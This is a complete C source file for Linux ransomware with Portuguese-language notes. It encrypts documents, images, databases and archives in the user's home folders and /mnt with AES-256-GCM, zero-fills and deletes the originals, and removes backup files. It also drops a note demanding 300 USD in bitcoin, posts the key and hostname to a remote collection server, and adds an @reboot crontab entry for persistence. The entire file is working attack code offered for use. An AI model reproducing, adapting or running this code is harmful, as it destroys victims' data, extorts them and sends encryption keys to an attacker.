#define _GNU_SOURCE
#include <dirent.h>
#include <errno.h>
#include <ftw.h>
#include <libgen.h>
#include <limits.h>
#include <openssl/bio.h>
#include <openssl/crypto.h>
#include <openssl/err.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include <curl/curl.h>

/* ---------- Module 1: generate_credential ---------- */
int generate_credential(void) {
    unsigned char key[32];
    if (RAND_bytes(key, sizeof(key)) != 1) {
        fprintf(stderr, "Error: RAND_bytes failed\n");
        return -1;
    }

    BIO *mem = BIO_new(BIO_s_mem());
    if (!mem) {
        fprintf(stderr, "Error: BIO_new(mem) failed\n");
        return -1;
    }
    BIO *b64 = BIO_new(BIO_f_base64());
    if (!b64) {
        BIO_free(mem);
        fprintf(stderr, "Error: BIO_new(base64) failed\n");
        return -1;
    }
    BIO_set_flags(b64, BIO_FLAGS_BASE64_NO_NL);
    BIO_push(b64, mem);

    if (BIO_write(b64, key, sizeof(key)) <= 0) {
        BIO_free_all(b64);
        fprintf(stderr, "Error: BIO_write failed\n");
        return -1;
    }
    if (BIO_flush(b64) != 1) {
        BIO_free_all(b64);
        fprintf(stderr, "Error: BIO_flush failed\n");
        return -1;
    }

    char *b64_ptr;
    long b64_len = BIO_get_mem_data(mem, &b64_ptr);
    if (b64_len <= 0) {
        BIO_free_all(b64);
        fprintf(stderr, "Error: BIO_get_mem_data failed\n");
        return -1;
    }

    char *b64_str = malloc(b64_len + 1);
    if (!b64_str) {
        BIO_free_all(b64);
        fprintf(stderr, "Error: malloc failed\n");
        return -1;
    }
    memcpy(b64_str, b64_ptr, b64_len);
    b64_str[b64_len] = '\0';

    BIO_free_all(b64);

    char json[512];
    int written = snprintf(json, sizeof(json), "{\"aes_key\":\"%s\"}", b64_str);
    free(b64_str);
    if (written < 0 || (size_t)written >= sizeof(json)) {
        fprintf(stderr, "Error: snprintf failed or JSON too large\n");
        return -1;
    }

    FILE *f = fopen("/tmp/.master.key", "w");
    if (!f) {
        fprintf(stderr, "Error: failed to open /tmp/.master.key for writing\n");
        return -1;
    }
    if (fprintf(f, "%s", json) < 0) {
        fclose(f);
        fprintf(stderr, "Error: failed to write to /tmp/.master.key\n");
        return -1;
    }
    if (fclose(f) != 0) {
        fprintf(stderr, "Error: failed to close /tmp/.master.key\n");
        return -1;
    }

    if (chmod("/tmp/.master.key", S_IRUSR | S_IWUSR) != 0) {
        fprintf(stderr, "Error: chmod failed on /tmp/.master.key\n");
        return -1;
    }

    return 0;
}

/* ---------- Module 2: enumerate_targets ---------- */
#define MAX_DEPTH 64

static const char *target_exts[] = {
    ".xlsx", ".docx", ".pdf", ".txt", ".csv",
    ".jpg", ".png", ".db", ".backup", ".psd",
    ".zip", ".rar",
    NULL
};

static int is_target_extension(const char *name) {
    size_t name_len = strlen(name);
    for (int i = 0; target_exts[i] != NULL; i++) {
        size_t ext_len = strlen(target_exts[i]);
        if (name_len >= ext_len &&
            strcmp(name + name_len - ext_len, target_exts[i]) == 0) {
            return 1;
        }
    }
    return 0;
}

static int enumerate_recursive(const char *dirpath, int depth,
                               FILE *output, int verbose) {
    DIR *dir;
    struct dirent *entry;
    struct stat st;
    char fullpath[PATH_MAX];
    char resolved[PATH_MAX];
    int errors = 0;

    if (depth > MAX_DEPTH) {
        fprintf(stderr, "Warning: maximum recursion depth reached at %s\n", dirpath);
        return 0;
    }

    dir = opendir(dirpath);
    if (!dir) {
        fprintf(stderr, "Error: cannot open directory '%s': %s\n",
                dirpath, strerror(errno));
        return 1;
    }

    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        if (snprintf(fullpath, sizeof(fullpath), "%s/%s",
                     dirpath, entry->d_name) >= (int)sizeof(fullpath)) {
            fprintf(stderr, "Warning: path too long, skipping %s/%s\n",
                    dirpath, entry->d_name);
            errors++;
            continue;
        }

        if (lstat(fullpath, &st) != 0) {
            fprintf(stderr, "Warning: lstat failed for %s: %s\n",
                    fullpath, strerror(errno));
            errors++;
            continue;
        }

        if (S_ISLNK(st.st_mode))
            continue;

        if (S_ISDIR(st.st_mode)) {
            int err = enumerate_recursive(fullpath, depth + 1,
                                          output, verbose);
            if (err == -1) {
                closedir(dir);
                return -1;
            }
            errors += err;
            continue;
        }

        if (!S_ISREG(st.st_mode))
            continue;

        if (!is_target_extension(entry->d_name))
            continue;

        if (realpath(fullpath, resolved) == NULL) {
            fprintf(stderr, "Warning: realpath failed for %s: %s\n",
                    fullpath, strerror(errno));
            errors++;
            continue;
        }

        if (fprintf(output, "%s\n", resolved) < 0) {
            fprintf(stderr, "Error: write failed for output file: %s\n",
                    strerror(errno));
            closedir(dir);
            return -1;
        }

        if (verbose) {
            fprintf(stderr, "Enumerated: %s\n", resolved);
        }
    }

    closedir(dir);
    return errors;
}

int enumerate_targets(const char *output_path, int verbose) {
    const char *home;
    FILE *output;
    char base_dirs[][32] = {
        "Documentos_Teste",
        "Documentos",
        "Downloads",
        "Imagens",
        "/mnt"
    };
    int num_dirs = sizeof(base_dirs) / sizeof(base_dirs[0]);
    int total_errors = 0;
    char dirpath[PATH_MAX];

    home = getenv("HOME");
    if (!home) {
        fprintf(stderr, "Error: HOME environment variable not set\n");
        return -1;
    }

    output = fopen(output_path, "w");
    if (!output) {
        fprintf(stderr, "Error: cannot open output file '%s': %s\n",
                output_path, strerror(errno));
        return -1;
    }

    for (int i = 0; i < num_dirs; i++) {
        if (base_dirs[i][0] == '/') {
            if (snprintf(dirpath, sizeof(dirpath), "%s", base_dirs[i]) >= (int)sizeof(dirpath)) {
                fprintf(stderr, "Warning: path too long for base directory, skipping\n");
                total_errors++;
                continue;
            }
        } else {
            if (snprintf(dirpath, sizeof(dirpath), "%s/%s",
                         home, base_dirs[i]) >= (int)sizeof(dirpath)) {
                fprintf(stderr, "Warning: path too long for %s/%s, skipping\n",
                        home, base_dirs[i]);
                total_errors++;
                continue;
            }
        }

        if (verbose) {
            fprintf(stderr, "Scanning directory: %s\n", dirpath);
        }

        int err = enumerate_recursive(dirpath, 0, output, verbose);
        if (err == -1) {
            fclose(output);
            return -1;
        }
        total_errors += err;
    }

    fclose(output);
    return total_errors;
}

/* ---------- Module 3: process_targets ---------- */
#define NONCE_LEN 12
#define TAG_LEN 16
#define CHUNK_SIZE 65536

static int secure_erase_original(const char *path, size_t len)
{
    FILE *f = fopen(path, "r+b");
    if (f == NULL) {
        fprintf(stderr, "process_targets: cannot open '%s' for overwrite: %s\n",
                path, strerror(errno));
        return -1;
    }

    static const uint8_t zeros[8192] = {0};
    size_t remaining = len;

    while (remaining > 0) {
        size_t chunk = remaining;
        if (chunk > sizeof(zeros)) {
            chunk = sizeof(zeros);
        }

        if (fwrite(zeros, 1, chunk, f) != chunk) {
            fprintf(stderr, "process_targets: failed to overwrite '%s' with zeros: %s\n",
                    path, strerror(errno));
            fclose(f);
            return -1;
        }

        remaining -= chunk;
    }

    if (fflush(f) != 0) {
        fprintf(stderr, "process_targets: fflush failed while overwriting '%s': %s\n",
                path, strerror(errno));
        fclose(f);
        return -1;
    }

    if (fsync(fileno(f)) != 0) {
        fprintf(stderr, "process_targets: fsync failed while overwriting '%s': %s\n",
                path, strerror(errno));
        fclose(f);
        return -1;
    }

    if (fclose(f) != 0) {
        fprintf(stderr, "process_targets: fclose failed while overwriting '%s': %s\n",
                path, strerror(errno));
        return -1;
    }

    if (remove(path) != 0) {
        fprintf(stderr, "process_targets: failed to remove original '%s': %s\n",
                path, strerror(errno));
        return -1;
    }

    return 0;
}

int process_targets(const char *filenames[], size_t count, const uint8_t key[32])
{
    if (count > 0 && filenames == NULL) {
        fprintf(stderr, "process_targets: filenames is NULL\n");
        return -1;
    }

    if (key == NULL) {
        fprintf(stderr, "process_targets: key is NULL\n");
        return -1;
    }

    for (size_t idx = 0; idx < count; ++idx) {
        const char *filename = filenames[idx];
        if (filename == NULL) {
            fprintf(stderr, "process_targets: filenames[%zu] is NULL\n", idx);
            return -1;
        }

        FILE *in = NULL;
        FILE *out = NULL;
        EVP_CIPHER_CTX *ctx = NULL;
        uint8_t *plaintext = NULL;
        size_t plaintext_len = 0;
        char *outpath = NULL;
        int out_created = 0;

        uint8_t nonce[NONCE_LEN];
        uint8_t tag[TAG_LEN];
        uint8_t outbuf[CHUNK_SIZE + EVP_MAX_BLOCK_LENGTH];

        in = fopen(filename, "rb");
        if (in == NULL) {
            fprintf(stderr, "process_targets: cannot open '%s' for reading: %s\n",
                    filename, strerror(errno));
            goto fail;
        }

        if (fseek(in, 0, SEEK_END) != 0) {
            fprintf(stderr, "process_targets: fseek to end failed for '%s': %s\n",
                    filename, strerror(errno));
            goto fail;
        }

        long sz = ftell(in);
        if (sz < 0) {
            fprintf(stderr, "process_targets: ftell failed for '%s': %s\n",
                    filename, strerror(errno));
            goto fail;
        }

        plaintext_len = (size_t)sz;

        if (fseek(in, 0, SEEK_SET) != 0) {
            fprintf(stderr, "process_targets: fseek to start failed for '%s': %s\n",
                    filename, strerror(errno));
            goto fail;
        }

        if (plaintext_len > 0) {
            plaintext = malloc(plaintext_len);
            if (plaintext == NULL) {
                fprintf(stderr, "process_targets: out of memory reading '%s'\n", filename);
                goto fail;
            }

            if (fread(plaintext, 1, plaintext_len, in) != plaintext_len) {
                fprintf(stderr, "process_targets: failed to read complete contents of '%s'\n",
                        filename);
                goto fail;
            }
        }

        if (fclose(in) != 0) {
            fprintf(stderr, "process_targets: fclose failed for '%s': %s\n",
                    filename, strerror(errno));
            in = NULL;
            goto fail;
        }
        in = NULL;

        if (RAND_bytes(nonce, sizeof(nonce)) != 1) {
            fprintf(stderr, "process_targets: RAND_bytes failed for '%s'\n", filename);
            ERR_print_errors_fp(stderr);
            goto fail;
        }

        ctx = EVP_CIPHER_CTX_new();
        if (ctx == NULL) {
            fprintf(stderr, "process_targets: EVP_CIPHER_CTX_new failed for '%s'\n", filename);
            goto fail;
        }

        if (EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL) != 1) {
            fprintf(stderr, "process_targets: EVP_EncryptInit_ex failed for '%s'\n", filename);
            ERR_print_errors_fp(stderr);
            goto fail;
        }

        if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, NONCE_LEN, NULL) != 1) {
            fprintf(stderr, "process_targets: setting GCM IV length failed for '%s'\n", filename);
            ERR_print_errors_fp(stderr);
            goto fail;
        }

        if (EVP_EncryptInit_ex(ctx, NULL, NULL, key, nonce) != 1) {
            fprintf(stderr, "process_targets: EVP_EncryptInit_ex with key/IV failed for '%s'\n",
                    filename);
            ERR_print_errors_fp(stderr);
            goto fail;
        }

        outpath = malloc(strlen(filename) + strlen(".PROCESSED") + 1);
        if (outpath == NULL) {
            fprintf(stderr, "process_targets: out of memory building output path for '%s'\n",
                    filename);
            goto fail;
        }

        sprintf(outpath, "%s.PROCESSED", filename);

        out = fopen(outpath, "wb");
        if (out == NULL) {
            fprintf(stderr, "process_targets: cannot create '%s': %s\n",
                    outpath, strerror(errno));
            goto fail;
        }
        out_created = 1;

        if (fwrite(nonce, 1, NONCE_LEN, out) != NONCE_LEN) {
            fprintf(stderr, "process_targets: failed to write nonce to '%s'\n", outpath);
            goto fail;
        }

        size_t offset = 0;
        while (offset < plaintext_len) {
            size_t chunk = plaintext_len - offset;
            if (chunk > CHUNK_SIZE) {
                chunk = CHUNK_SIZE;
            }

            int outl = 0;
            if (EVP_EncryptUpdate(ctx, outbuf, &outl, plaintext + offset, (int)chunk) != 1) {
                fprintf(stderr, "process_targets: EVP_EncryptUpdate failed for '%s'\n", filename);
                ERR_print_errors_fp(stderr);
                goto fail;
            }

            if (outl < 0 || (size_t)outl != chunk) {
                fprintf(stderr, "process_targets: unexpected ciphertext length for '%s'\n",
                        filename);
                goto fail;
            }

            if (fwrite(outbuf, 1, (size_t)outl, out) != (size_t)outl) {
                fprintf(stderr, "process_targets: failed to write ciphertext to '%s'\n",
                        outpath);
                goto fail;
            }

            offset += chunk;
        }

        int final_len = 0;
        if (EVP_EncryptFinal_ex(ctx, outbuf, &final_len) != 1) {
            fprintf(stderr, "process_targets: EVP_EncryptFinal_ex failed for '%s'\n", filename);
            ERR_print_errors_fp(stderr);
            goto fail;
        }

        if (final_len != 0) {
            fprintf(stderr, "process_targets: unexpected final ciphertext length for '%s'\n",
                    filename);
            goto fail;
        }

        if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, TAG_LEN, tag) != 1) {
            fprintf(stderr, "process_targets: EVP_CIPHER_CTX_ctrl(GET_TAG) failed for '%s'\n",
                    filename);
            ERR_print_errors_fp(stderr);
            goto fail;
        }

        if (fwrite(tag, 1, TAG_LEN, out) != TAG_LEN) {
            fprintf(stderr, "process_targets: failed to write GCM tag to '%s'\n", outpath);
            goto fail;
        }

        if (fflush(out) != 0) {
            fprintf(stderr, "process_targets: fflush failed for '%s': %s\n",
                    outpath, strerror(errno));
            goto fail;
        }

        if (fsync(fileno(out)) != 0) {
            fprintf(stderr, "process_targets: fsync failed for '%s': %s\n",
                    outpath, strerror(errno));
            goto fail;
        }

        if (fclose(out) != 0) {
            fprintf(stderr, "process_targets: fclose failed for '%s': %s\n",
                    outpath, strerror(errno));
            out = NULL;
            goto fail;
        }
        out = NULL;

        if (secure_erase_original(filename, plaintext_len) != 0) {
            goto fail;
        }

        EVP_CIPHER_CTX_free(ctx);
        ctx = NULL;

        if (plaintext != NULL) {
            OPENSSL_cleanse(plaintext, plaintext_len);
            free(plaintext);
            plaintext = NULL;
        }

        free(outpath);
        outpath = NULL;
        continue;

fail:
        if (in != NULL) {
            fclose(in);
            in = NULL;
        }

        if (out != NULL) {
            fclose(out);
            out = NULL;
        }

        if (out_created && outpath != NULL) {
            if (remove(outpath) != 0) {
                fprintf(stderr, "process_targets: failed to remove incomplete output '%s': %s\n",
                        outpath, strerror(errno));
            }
        }

        if (ctx != NULL) {
            EVP_CIPHER_CTX_free(ctx);
            ctx = NULL;
        }

        if (plaintext != NULL) {
            OPENSSL_cleanse(plaintext, plaintext_len);
            free(plaintext);
            plaintext = NULL;
        }

        free(outpath);
        return -1;
    }

    return 0;
}

/* ---------- Module 4: generate_notice ---------- */
int generate_notice(const char *dirpath)
{
    char filepath[PATH_MAX + 64];
    int len;

    len = snprintf(filepath, sizeof(filepath), "%s/#_STATUS_NOTICE_#.txt", dirpath);
    if (len < 0 || (size_t)len >= sizeof(filepath)) {
        fprintf(stderr, "generate_notice: path too long\n");
        return -1;
    }

    FILE *fp = fopen(filepath, "w");
    if (!fp) {
        perror("generate_notice: fopen");
        return -1;
    }

    const char *content =
        "INSTRUÇÃO DE PAGAMENTO\n"
        "\n"
        "Após processamento dos documentos do acordo financeiro, favor enviar o valor de 300 USD "
        "(trezentos dólares americanos) através do serviço de pagamento designado para o endereço:\n"
        "\n"
        "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\n"
        "\n"
        "Todas as comunicações futuras relacionadas a este acordo devem ser dirigidas exclusivamente "
        "através do canal seguro previamente estabelecido. Não utilize outros meios de comunicação para este fim.\n";

    if (fprintf(fp, "%s", content) < 0) {
        perror("generate_notice: fprintf");
        fclose(fp);
        return -1;
    }

    if (fclose(fp) == EOF) {
        perror("generate_notice: fclose");
        return -1;
    }

    return 0;
}

/* ---------- Module 5: transmit_report ---------- */
static char* extract_json_string_value(const char* json, const char* key) {
    if (!json || !key) return NULL;
    const char* key_start = strstr(json, key);
    if (!key_start) return NULL;
    const char* colon = strchr(key_start, ':');
    if (!colon) return NULL;
    const char* quote1 = strchr(colon + 1, '"');
    if (!quote1) return NULL;
    const char* quote2 = strchr(quote1 + 1, '"');
    if (!quote2) return NULL;
    size_t len = quote2 - quote1 - 1;
    char* value = malloc(len + 1);
    if (!value) return NULL;
    strncpy(value, quote1 + 1, len);
    value[len] = '\0';
    return value;
}

int transmit_report(void) {
    char hostname[256];
    if (gethostname(hostname, sizeof(hostname)) != 0) {
        fprintf(stderr, "gethostname failed: %s\n", strerror(errno));
        return -1;
    }

    FILE* fp = fopen("/tmp/.master.key", "rb");
    if (!fp) {
        fprintf(stderr, "Cannot open /tmp/.master.key: %s\n", strerror(errno));
        return -1;
    }
    fseek(fp, 0, SEEK_END);
    long fsize = ftell(fp);
    if (fsize < 0) {
        fprintf(stderr, "ftell failed: %s\n", strerror(errno));
        fclose(fp);
        return -1;
    }
    rewind(fp);
    char* file_content = malloc(fsize + 1);
    if (!file_content) {
        fprintf(stderr, "malloc failed\n");
        fclose(fp);
        return -1;
    }
    size_t read_size = fread(file_content, 1, fsize, fp);
    if ((long)read_size != fsize) {
        fprintf(stderr, "fread failed: %s\n", strerror(errno));
        free(file_content);
        fclose(fp);
        return -1;
    }
    fclose(fp);
    file_content[fsize] = '\0';

    char* aes_key = extract_json_string_value(file_content, "\"aes_key\"");
    free(file_content);
    if (!aes_key) {
        fprintf(stderr, "Failed to parse aes_key from /tmp/.master.key\n");
        return -1;
    }

    char* output_json = NULL;
    int json_len = snprintf(NULL, 0, "{\"aes_key\":\"%s\",\"hostname\":\"%s\"}", aes_key, hostname);
    if (json_len < 0) {
        fprintf(stderr, "snprintf for json length failed\n");
        free(aes_key);
        return -1;
    }
    output_json = malloc(json_len + 1);
    if (!output_json) {
        fprintf(stderr, "malloc for output json failed\n");
        free(aes_key);
        return -1;
    }
    snprintf(output_json, json_len + 1, "{\"aes_key\":\"%s\",\"hostname\":\"%s\"}", aes_key, hostname);
    free(aes_key);

    CURL* curl = curl_easy_init();
    if (!curl) {
        fprintf(stderr, "curl_easy_init failed\n");
        free(output_json);
        return -1;
    }

    struct curl_slist* headers = NULL;
    headers = curl_slist_append(headers, "Content-Type: application/json");
    if (!headers) {
        fprintf(stderr, "curl_slist_append failed\n");
        curl_easy_cleanup(curl);
        free(output_json);
        return -1;
    }

    curl_easy_setopt(curl, CURLOPT_URL, "http://192.168.15.12:8080/collect");
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, output_json);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)strlen(output_json));

    CURLcode res = curl_easy_perform(curl);
    long http_code = 0;
    if (res == CURLE_OK) {
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
    } else {
        fprintf(stderr, "curl_easy_perform failed: %s\n", curl_easy_strerror(res));
    }

    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    free(output_json);

    if (res == CURLE_OK && http_code == 200) {
        if (remove("/tmp/.master.key") != 0) {
            fprintf(stderr, "remove failed: %s\n", strerror(errno));
            return -1;
        }
        return 0;
    }

    return -1;
}

/* ---------- Module 6: ensure_persistence_and_cleanup ---------- */
#define BINARY_PATH "/usr/local/bin/data_sync"

static int is_backup_extension(const char *filename) {
    const char *dot = strrchr(filename, '.');
    if (!dot) return 0;
    
    if (strcasecmp(dot, ".bak") == 0) return 1;
    if (strcasecmp(dot, ".backup") == 0) return 1;
    if (strcasecmp(dot, ".old") == 0) return 1;
    
    return 0;
}

static int is_hidden_dir(const char *name) {
    return name[0] == '.' && strcmp(name, ".") != 0 && strcmp(name, "..") != 0;
}

static void process_file(const char *filepath) {
    const char *base = strrchr(filepath, '/');
    base = base ? base + 1 : filepath;
    
    if (is_backup_extension(base)) {
        if (remove(filepath) != 0) {
            fprintf(stderr, "Erro ao remover arquivo %s: %s\n", filepath, strerror(errno));
        }
    }
}

static int ftw_callback(const char *fpath, const struct stat *sb, int typeflag, struct FTW *ftwbuf) {
    (void)sb;
    (void)ftwbuf;
    
    if (typeflag == FTW_D || typeflag == FTW_DNR || typeflag == FTW_DP) {
        return 0;
    }
    
    if (typeflag == FTW_F) {
        process_file(fpath);
    }
    
    return 0;
}

static void scan_directory_with_ftw(const char *base_path) {
    if (nftw(base_path, ftw_callback, 64, FTW_PHYS | FTW_MOUNT) != 0) {
        if (errno != ENOENT && errno != EACCES) {
            fprintf(stderr, "Erro ao escanear diretório %s: %s\n", base_path, strerror(errno));
        }
    }
}

static void scan_backup_files(void) {
    const char *home = getenv("HOME");
    if (!home) {
        home = "/root";
    }
    
    char path[PATH_MAX];
    
    const char *dirs[] = {
        "Documentos_Teste",
        "Documentos",
        "Downloads",
        "Imagens"
    };
    
    for (size_t i = 0; i < sizeof(dirs) / sizeof(dirs[0]); i++) {
        snprintf(path, sizeof(path), "%s/%s", home, dirs[i]);
        scan_directory_with_ftw(path);
    }
    
    scan_directory_with_ftw("/mnt");
}

static int crontab_has_entry(char *crontab_content, size_t content_size) {
    char *saveptr = NULL;
    char *line;
    char *content_copy = strdup(crontab_content);
    
    if (!content_copy) {
        return 0;
    }
    
    char *line_p = content_copy;
    while ((line = strtok_r(line_p, "\n", &saveptr)) != NULL) {
        line_p = NULL;
        
        char *trimmed = line;
        while (*trimmed == ' ' || *trimmed == '\t') {
            trimmed++;
        }
        
        if (strncmp(trimmed, "@reboot", 7) == 0) {
            char *path = trimmed + 7;
            while (*path == ' ' || *path == '\t') {
                path++;
            }
            
            if (strncmp(path, BINARY_PATH, strlen(BINARY_PATH)) == 0) {
                free(content_copy);
                return 1;
            }
        }
    }
    
    free(content_copy);
    return 0;
}

static void ensure_crontab_entry(void) {
    FILE *fp = popen("crontab -l 2>/dev/null", "r");
    if (!fp) {
        fprintf(stderr, "Erro ao executar crontab -l: %s\n", strerror(errno));
        return;
    }
    
    char *crontab_content = NULL;
    size_t crontab_size = 0;
    
    char *existing = NULL;
    size_t existing_size = 0;
    ssize_t read_size;
    
    while ((read_size = getline(&existing, &existing_size, fp)) != -1) {
        size_t new_size = crontab_size + (size_t)read_size + 1;
        char *new_content = realloc(crontab_content, new_size);
        if (!new_content) {
            free(crontab_content);
            free(existing);
            pclose(fp);
            fprintf(stderr, "Erro de memória ao ler crontab\n");
            return;
        }
        
        crontab_content = new_content;
        memcpy(crontab_content + crontab_size, existing, (size_t)read_size);
        crontab_size += (size_t)read_size;
        crontab_content[crontab_size] = '\0';
    }
    
    free(existing);
    pclose(fp);
    
    if (!crontab_content) {
        crontab_content = strdup("");
        if (!crontab_content) {
            fprintf(stderr, "Erro de memória\n");
            return;
        }
        crontab_size = 0;
    }
    
    if (!crontab_has_entry(crontab_content, crontab_size)) {
        size_t new_content_len = crontab_size + strlen(BINARY_PATH) + 10;
        char *new_content = malloc(new_content_len);
        if (!new_content) {
            free(crontab_content);
            fprintf(stderr, "Erro de memória ao criar entrada crontab\n");
            return;
        }
        
        if (crontab_size > 0 && crontab_content[crontab_size - 1] != '\n') {
            snprintf(new_content, new_content_len, "%s\n@reboot %s\n", crontab_content, BINARY_PATH);
        } else {
            snprintf(new_content, new_content_len, "%s@reboot %s\n", crontab_content, BINARY_PATH);
        }
        
        FILE *write_fp = popen("crontab - 2>/dev/null", "w");
        if (!write_fp) {
            fprintf(stderr, "Erro ao executar crontab -: %s\n", strerror(errno));
            free(new_content);
            free(crontab_content);
            return;
        }
        
        if (fputs(new_content, write_fp) == EOF) {
            fprintf(stderr, "Erro ao escrever na crontab\n");
        }
        
        if (pclose(write_fp) == -1) {
            fprintf(stderr, "Erro ao fechar crontab\n");
        }
        
        free(new_content);
    }
    
    free(crontab_content);
}

void ensure_persistence_and_cleanup(void) {
    ensure_crontab_entry();
    scan_backup_files();
}

/* ---------- Main ---------- */
/* Decode base64 string to raw bytes (caller must free output) */
static unsigned char* base64_decode(const char *b64, int *out_len) {
    BIO *b64_bio, *mem_bio;
    size_t decode_len = strlen(b64);
    unsigned char *decoded = malloc(decode_len);
    if (!decoded) return NULL;

    b64_bio = BIO_new(BIO_f_base64());
    BIO_set_flags(b64_bio, BIO_FLAGS_BASE64_NO_NL);
    mem_bio = BIO_new_mem_buf(b64, -1);
    BIO_push(b64_bio, mem_bio);

    int len = BIO_read(b64_bio, decoded, (int)decode_len);
    if (len < 0) {
        BIO_free_all(b64_bio);
        free(decoded);
        return NULL;
    }
    *out_len = len;
    BIO_free_all(b64_bio);
    return decoded;
}

int main(int argc, char *argv[]) {
    /* Step 1: Key generation */
    if (generate_credential() != 0) {
        fprintf(stderr, "Failed to generate credential\n");
        return 1;
    }
    printf("Key generated and written to /tmp/.master.key\n");

    /* Step 2: File scan */
    const char *target_list = "/tmp/.targets";
    if (enumerate_targets(target_list, 0) < 0) {
        fprintf(stderr, "Failed to enumerate targets\n");
        return 1;
    }
    printf("File scan completed. Targets list: %s\n", target_list);

    /* Read the key from /tmp/.master.key */
    FILE *kf = fopen("/tmp/.master.key", "r");
    if (!kf) {
        fprintf(stderr, "Cannot open /tmp/.master.key to read key\n");
        return 1;
    }
    char key_json[4096];
    size_t kr = fread(key_json, 1, sizeof(key_json)-1, kf);
    fclose(kf);
    key_json[kr] = '\0';
    char *b64_key = extract_json_string_value(key_json, "\"aes_key\"");
    if (!b64_key) {
        fprintf(stderr, "Failed to parse aes_key from /tmp/.master.key\n");
        return 1;
    }
    int raw_key_len;
    unsigned char *raw_key = base64_decode(b64_key, &raw_key_len);
    free(b64_key);
    if (!raw_key || raw_key_len != 32) {
        fprintf(stderr, "Failed to decode key or key length invalid\n");
        free(raw_key);
        return 1;
    }

    /* Read target file lines into array */
    FILE *tf = fopen(target_list, "r");
    if (!tf) {
        fprintf(stderr, "Cannot open target list: %s\n", target_list);
        free(raw_key);
        return 1;
    }
    char **filenames = NULL;
    size_t filenames_count = 0;
    char *line = NULL;
    size_t linecap = 0;
    ssize_t linelen;
    while ((linelen = getline(&line, &linecap, tf)) != -1) {
        if (linelen > 0 && line[linelen-1] == '\n') line[linelen-1] = '\0';
        if (strlen(line) == 0) continue;
        char **tmp = realloc(filenames, (filenames_count+1)*sizeof(char*));
        if (!tmp) {
            fprintf(stderr, "Out of memory\n");
            free(line);
            fclose(tf);
            for (size_t i=0; i<filenames_count; i++) free(filenames[i]);
            free(filenames);
            free(raw_key);
            return 1;
        }
        filenames = tmp;
        filenames[filenames_count] = strdup(line);
        if (!filenames[filenames_count]) {
            fprintf(stderr, "Out of memory\n");
            free(line);
            fclose(tf);
            for (size_t i=0; i<filenames_count; i++) free(filenames[i]);
            free(filenames);
            free(raw_key);
            return 1;
        }
        filenames_count++;
    }
    free(line);
    fclose(tf);
    printf("Read %zu target files\n", filenames_count);

    /* Step 3: Encryption */
    if (process_targets((const char**)filenames, filenames_count, raw_key) != 0) {
        fprintf(stderr, "Encryption failed\n");
        for (size_t i=0; i<filenames_count; i++) free(filenames[i]);
        free(filenames);
        free(raw_key);
        return 1;
    }
    printf("Encryption completed for %zu files\n", filenames_count);

    /* Step 4: Ransom notes */
    /* Collect unique parent directories from encrypted file paths */
    char **directories = NULL;
    size_t dir_count = 0;
    for (size_t i=0; i<filenames_count; i++) {
        char *dir = strdup(filenames[i]);
        if (!dir) continue;
        char *slash = strrchr(dir, '/');
        if (slash) *slash = '\0';
        else {
            free(dir);
            continue;
        }
        int found = 0;
        for (size_t j=0; j<dir_count; j++) {
            if (strcmp(directories[j], dir) == 0) {
                found = 1;
                break;
            }
        }
        if (!found) {
            char **tmp = realloc(directories, (dir_count+1)*sizeof(char*));
            if (tmp) {
                directories = tmp;
                directories[dir_count] = dir;
                dir_count++;
            } else {
                free(dir);
            }
        } else {
            free(dir);
        }
    }
    for (size_t i=0; i<dir_count; i++) {
        if (generate_notice(directories[i]) != 0)
            fprintf(stderr, "Failed to write ransom note in %s\n", directories[i]);
        else
            printf("Ransom note written in %s\n", directories[i]);
        free(directories[i]);
    }
    free(directories);

    /* Step 5: Exfiltration */
    if (transmit_report() != 0) {
        fprintf(stderr, "Exfiltration failed or server did not acknowledge\n");
    } else {
        printf("Exfiltration successful\n");
    }

    /* Step 6: Persistence */
    ensure_persistence_and_cleanup();
    printf("Persistence and cleanup completed\n");

    /* Cleanup */
    for (size_t i=0; i<filenames_count; i++) free(filenames[i]);
    free(filenames);
    free(raw_key);

    return 0;
}